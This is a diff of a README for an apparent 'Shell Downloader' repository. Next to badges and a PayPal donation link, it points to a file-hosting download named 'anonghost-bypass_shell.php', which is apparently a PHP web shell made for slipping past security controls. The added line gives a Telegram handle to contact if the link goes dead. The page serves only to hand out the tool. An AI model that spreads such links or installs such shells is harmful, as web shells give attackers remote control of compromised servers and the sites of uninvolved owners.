@@ -14,6 +14,7 @@ Date : 10 January 2023 [![Windows Badge](https://img.shields.io/badge/Windows-bl
 	buy me a cofee<code><a href="https://www.paypal.com/paypalme/juliawoods000"><img title="Paypal Donation" height="25" src="https://ionicabizau.github.io/badges/paypal.svg" /></a></code></div></br>
 	<h1><img width="80%" src="https://readme-typing-svg.herokuapp.com?font=Ubuntu&size=30&color=00FF00&center=true&vCenter=true&width=440&lines=+Shell+Downloader" /></h1>
 <div align="center"> 
+contact me in telegram if lost link @haxorisland ( OMEST )
   
 # <a href="https://www.mediafire.com/file/882sddgbo0rv8q6/anonghost-bypass_shell.php/file">AnonGhost Bypass</a>
 <img src="https://imgur.com/ZBxBGXu.png" alt="beruangsalju profile">
